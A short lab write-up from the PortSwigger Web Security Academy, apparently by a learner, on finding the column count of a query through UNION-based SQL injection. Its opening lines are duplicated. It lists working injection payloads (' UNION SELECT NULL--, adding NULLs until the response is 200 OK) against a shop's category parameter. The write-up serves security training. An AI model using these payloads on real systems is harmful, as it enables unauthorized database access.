# PortSwigger Lab: SQL injection Union attack, determining the number of columns returned by the query

- **Category:** SQL Injection (UNION Attack)
- **Difficulty:** Apprentice

## 1.Objective
Determine the number of columns returned by the vulnerable query in the product category filter.

# PortSwigger Lab: SQL injection UNION attack, determining the number of columns returned by the query

- **Category:** SQL Injection (UNION Attack)
- **Difficulty:** Apprentice

## 1. Objective
Determine the number of columns returned by the vulnerable query in the product category filter.

## 2. Exploitation Step-by-Step
1. Accessed the category filter in the shop.
2. Injected single quotes `'` to confirm the `category` parameter is vulnerable to SQLi.
3. Injected `UNION SELECT` adding `NULL` values progressively to find the exact column count:
   - `' UNION SELECT NULL--` -> Internal Server Error 500 (Column count mismatch)
   - `' UNION SELECT NULL, NULL--` -> Internal Server Error 500
   - `' UNION SELECT NULL, NULL, NULL--` -> **200 OK!**

## 3. Conclusion
The original database query returns **3 columns**.
